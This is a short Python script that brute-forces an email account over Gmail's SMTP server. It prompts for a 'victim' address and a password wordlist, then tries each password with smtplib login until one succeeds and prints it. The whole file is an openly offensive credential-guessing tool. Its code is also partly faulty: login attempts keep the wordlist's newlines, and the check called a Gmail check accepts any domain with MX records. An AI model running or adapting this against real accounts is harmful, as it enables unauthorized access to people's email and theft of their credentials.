import smtplib
import os
from dns import resolver
from validate_email import validate_email
from colored import fg, attr

green = fg("green")
red = fg("red")
reset = attr("reset")
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()

# victim_email = input("[*] Enter Email: ")
# is_valid = validate_email(victim_email, verify=True)


def is_valid_gmail(email):
    domain = email.split('@')[1]

    try:
        dns_resolver = resolver.Resolver()
        mx_records = dns_resolver.query(domain, 'MX')

        if len(mx_records) > 0:
            return True

    except resolver.NXDOMAIN:
        return False

    return False


victim_email = input("[*] Enter Email: ")
is_valid = is_valid_gmail(victim_email)


if is_valid:
    file_path = input("[*] Enter Passwords File: ")
    if os.path.exists(file_path):
        with open(file_path, "r") as f:
            for password in f:
                try:
                    server.login(victim_email, password)
                    server.connect()

                except Exception as e:
                    print(red + "[-] Password Not Found!", e)

                else:
                    print(green + "\n[+] Password Found!" + reset)
                    print("Email: " + victim_email)
                    print("Password: " + password.strip())
                    break

    else:
        print(red + "[-] File Not Found!")

else:
    print("[-] Gmail Not Found!")

input()
